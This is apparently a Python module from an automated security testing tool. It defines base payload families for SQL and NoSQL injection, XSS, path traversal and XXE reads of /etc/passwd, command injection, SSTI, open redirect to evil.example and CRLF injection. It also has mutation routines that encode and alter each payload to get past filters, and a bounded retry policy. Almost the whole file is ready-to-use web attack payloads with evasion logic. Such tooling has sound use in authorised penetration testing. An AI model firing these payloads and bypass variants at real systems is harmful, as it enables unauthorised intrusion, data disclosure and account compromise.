"""
Payload mutation engine -- deterministic payload families + mutation rules + a bounded retry policy,
zero-token. Turns one base payload into an ordered set of variants (encodings, case toggles,
comment/whitespace tricks, class-specific bypasses) so a technique can systematically try alternatives
when the first is filtered, without asking an LLM. Feeds the execution engines; the retry policy is
bounded + backed off so it never becomes a DoS.
"""
from __future__ import annotations

import urllib.parse

# Base payload families per vuln class -- starting points; _mutations() expands each.
FAMILIES = {
    "sqli": ["' OR 1=1--", "' OR '1'='1", "') OR ('1'='1", "1' UNION SELECT NULL--", "admin'--"],
    "nosqli": ["[$ne]=1", "'||'1'=='1", '{"$gt":""}'],
    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", '"><svg onload=alert(1)>',
            "javascript:alert(1)", '<iframe src="javascript:alert(`xss`)">'],
    "path_traversal": ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd",
                       "..\\..\\..\\..\\windows\\win.ini"],
    "command_injection": ["; id", "| id", "`id`", "$(id)", "&& id", "%0aid"],
    "ssti": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "*{7*7}"],
    "open_redirect": ["//evil.example", "https://evil.example", "/\\evil.example", "https:evil.example",
                      "//evil.example/%2e%2e"],
    "xxe": ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'],
    "crlf": ["%0d%0aSet-Cookie:injected=1", "\r\nSet-Cookie:injected=1"],
}


def _mutations(p):
    """Deterministic mutation set for one payload: encodings + case + whitespace/comment tricks."""
    if not p:
        return []
    out = [p, urllib.parse.quote(p, safe=""), urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""),
           p.replace(" ", "/**/"), p.swapcase(),
           "".join("%%%02x" % ord(ch) for ch in p[:40])]
    seen, uniq = set(), []
    for x in out:
        if x not in seen:
            seen.add(x)
            uniq.append(x)
    return uniq


def variants(vuln_class, base=None, limit=30):
    """Ordered, deduped payload variants for a vuln class: base payloads first, then their mutations."""
    fam = FAMILIES.get(str(vuln_class or "").lower(), [])
    out, seen = [], set()
    for b in ([base] if base else []) + fam:
        for v in _mutations(b):
            if v not in seen:
                seen.add(v)
                out.append(v)
                if len(out) >= limit:
                    return out
    return out


def retry_policy(vuln_class=None):
    """Bounded, backed-off retry contract -- deterministic escalation, never a DoS."""
    return {"max_attempts": 6, "variants_per_attempt": 4, "stop_on_confirm": True,
            "backoff_ms": [0, 200, 500, 1000, 2000, 4000]}
